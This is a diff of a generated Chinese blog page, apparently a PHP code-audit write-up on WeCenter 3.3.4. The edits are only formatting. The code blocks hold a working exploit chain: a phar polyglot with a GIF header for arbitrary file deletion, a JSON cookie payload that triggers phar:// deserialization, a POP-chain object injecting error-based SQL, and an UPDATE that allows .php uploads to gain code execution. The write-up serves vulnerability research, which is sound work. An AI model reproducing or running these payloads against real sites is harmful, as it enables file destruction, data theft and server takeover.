@@ -58,7 +58,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/03/23/XzNFRvUHp7k6Cfh.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/23/hZCNzY5JVtkO4rv.png">
 <meta property="article:published_time" content="2020-03-23T02:02:41.000Z">
-<meta property="article:modified_time" content="2020-03-23T11:20:05.651Z">
+<meta property="article:modified_time" content="2020-03-23T11:40:46.095Z">
 <meta property="article:author" content="glotozz">
 <meta property="article:tag" content="php代码审计">
 <meta name="twitter:card" content="summary">
@@ -176,11 +176,11 @@
 <li><a href="#漏洞分析">漏洞分析</a><ul>
 <li><a href="#反序列化触发点">反序列化触发点</a></li>
 <li><a href="#pop链">POP链</a></li>
+</ul>
+</li>
 <li><a href="#漏洞修复">漏洞修复</a></li>
 <li><a href="#总结">总结</a></li>
 <li><a href="#参考链接">参考链接</a></li>
-</ul>
-</li>
 </ul>
 <!-- tocstop -->
 
@@ -214,7 +214,7 @@
 <p><img src="https://i.loli.net/2020/03/23/OB5pGJacHzLXVFY.png" alt="Snipaste_2020-03-23_11-22-24.png"></p>
 <p>或者<code>system/Zend/Http/Response/Stream.php</code>也存在任意文件删除</p>
 <p>EXP</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class PHPExcel_Shared_XMLWriter&#123;</span><br><span class="line">		&#x2F;&#x2F;网站根目录下的a.txt</span><br><span class="line">		private $tempFileName  &#x3D; &#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;a.txt&#39;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar &#x3D; new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub，增加gif文件头</span><br><span class="line">    $o &#x3D; new PHPExcel_Shared_XMLWriter();</span><br><span class="line">    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">    &#x2F;&#x2F;签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">PHPExcel_Shared_XMLWriter</span></span>&#123;</span><br><span class="line">		<span class="comment">//网站根目录下的a.txt</span></span><br><span class="line">		<span class="keyword">private</span> $tempFileName  = <span class="string">'../../../../../a.txt'</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    $o = <span class="keyword">new</span> PHPExcel_Shared_XMLWriter();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>这里注意不能在头像处进行文件上传，因为</p>
 <p><img src="https://i.loli.net/2020/03/23/UaToMSN8CfAZV4h.png" alt="Snipaste_2020-03-23_15-09-46.png"></p>
@@ -223,7 +223,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;WeCenter_3-3-4&#x2F;uploads&#x2F;question&#x2F;20200323&#x2F;251b7693d9eaabaad4a4c05e5227ada2.gif</span><br></pre></td></tr></table></figure>
 
 <p>生成json</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $arr &#x3D; [];</span><br><span class="line">    $arr[&#39;access_token&#39;][&#39;openid&#39;] &#x3D; 1;</span><br><span class="line">    $arr[&#39;access_user&#39;][&#39;nickname&#39;] &#x3D; &#39;gqy&#39;;</span><br><span class="line">    $arr[&#39;access_user&#39;][&#39;headimgurl&#39;] &#x3D; &#39;phar:&#x2F;&#x2F;uploads&#x2F;question&#x2F;20200323&#x2F;251b7693d9eaabaad4a4c05e5227ada2.gif&#39;;</span><br><span class="line">    echo json_encode($arr);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $arr = [];</span><br><span class="line">    $arr[<span class="string">'access_token'</span>][<span class="string">'openid'</span>] = <span class="number">1</span>;</span><br><span class="line">    $arr[<span class="string">'access_user'</span>][<span class="string">'nickname'</span>] = <span class="string">'gqy'</span>;</span><br><span class="line">    $arr[<span class="string">'access_user'</span>][<span class="string">'headimgurl'</span>] = <span class="string">'phar://uploads/question/20200323/251b7693d9eaabaad4a4c05e5227ada2.gif'</span>;</span><br><span class="line">    <span class="keyword">echo</span> json_encode($arr);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>添加Cookie并访问<code>/app/m/weixin.php</code>的<code>binding_action</code></p>
 <p>通过下面的url格式调用方法</p>
@@ -243,7 +243,7 @@
 <p><strong>SQL注入</strong></p>
 <p><code>system/aws_model.inc.php</code></p>
 <p><img src="https://i.loli.net/2020/03/23/ROypYzmGgewFaBs.png" alt="Snipaste_2020-03-23_11-30-17.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class AWS_MODEL&#123;</span><br><span class="line">		private $_shutdown_query &#x3D; [&#39;gqy&#39;&#x3D;&gt;&#39;SELECT UPDATEXML(1, concat(0xa, user(), 0xa), 1)&#39;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AWS_MODEL</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $_shutdown_query = [<span class="string">'gqy'</span>=&gt;<span class="string">'SELECT UPDATEXML(1, concat(0xa, user(), 0xa), 1)'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2020/03/23/fgFWOZ6s9njyESm.png" alt="Snipaste_2020-03-23_17-45-23.png"></p>
 <p><strong>RCE</strong></p>
@@ -252,16 +252,15 @@
 <p>添加一个<code>gqyy</code>，通过查看sql执行语句可以发现是</p>
 <p><img src="https://i.loli.net/2020/03/23/OqfnUxmd5EMvAFi.png" alt="Snipaste_2020-03-23_18-15-09.png"></p>
 <p>那么直接添加一个php进去即可，注意转义</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class AWS_MODEL&#123;</span><br><span class="line">			private $_shutdown_query &#x3D; [&#39;UPDATE &#96;aws_system_setting&#96; SET &#96;value&#96; &#x3D; \&#39;s:45:&quot;jpg,jpeg,png,gif,zip,doc,docx,rar,pdf,psd,php&quot;;\&#39; WHERE (&#96;varname&#96; &#x3D; \&#39;allowed_upload_types\&#39;)&#39;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AWS_MODEL</span></span>&#123;</span><br><span class="line">			<span class="keyword">private</span> $_shutdown_query = [<span class="string">'UPDATE `aws_system_setting` SET `value` = \'s:45:"jpg,jpeg,png,gif,zip,doc,docx,rar,pdf,psd,php";\' WHERE (`varname` = \'allowed_upload_types\')'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2020/03/23/XzNFRvUHp7k6Cfh.png" alt="Snipaste_2020-03-23_18-37-51.png"></p>
-<h4><span id="漏洞修复">漏洞修复</span></h4><p>官方修复直接把下面这段注释掉了</p>
+<h3><span id="漏洞修复">漏洞修复</span></h3><p>官方修复直接把下面这段注释掉了</p>
 <p><img src="https://i.loli.net/2020/03/23/hZCNzY5JVtkO4rv.png" alt="Snipaste_2020-03-23_18-52-17.png"></p>
-<h4><span id="总结">总结</span></h4><p>整体挖掘思路还是很赞的，就是遇到一些奇怪的坑，还没解决。。。</p>
+<h3><span id="总结">总结</span></h3><p>整体挖掘思路还是很赞的，就是遇到一些奇怪的坑，还没解决。。。</p>
 <p>之后挖掘一下<code>v3.3.5</code>的试试</p>
-<h4><span id="参考链接">参考链接</span></h4><p> <a href="https://xz.aliyun.com/t/7077" target="_blank" rel="noopener">https://xz.aliyun.com/t/7077</a> </p>
-<p> <a href="https://mochazz.github.io/2020/01/16/WeCenter3.3.4SQL注入到RCE/#漏洞点" target="_blank" rel="noopener">https://mochazz.github.io/2020/01/16/WeCenter3.3.4SQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE/#%E6%BC%8F%E6%B4%9E%E7%82%B9</a> </p>
-<p>####</p>
+<h3><span id="参考链接">参考链接</span></h3><p> <a href="https://xz.aliyun.com/t/7077" target="_blank" rel="noopener">https://xz.aliyun.com/t/7077</a> </p>
+<p> <a href="https://mochazz.github.io/2020/01/16/WeCenter3.3.4SQL注入到RCE/#漏洞点" target="_blank" rel="noopener">https://mochazz.github.io/2020/01/16/WeCenter3.3.4SQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE/#%E6%BC%8F%E6%B4%9E%E7%82%B9</a></p>
 
             </div>
           
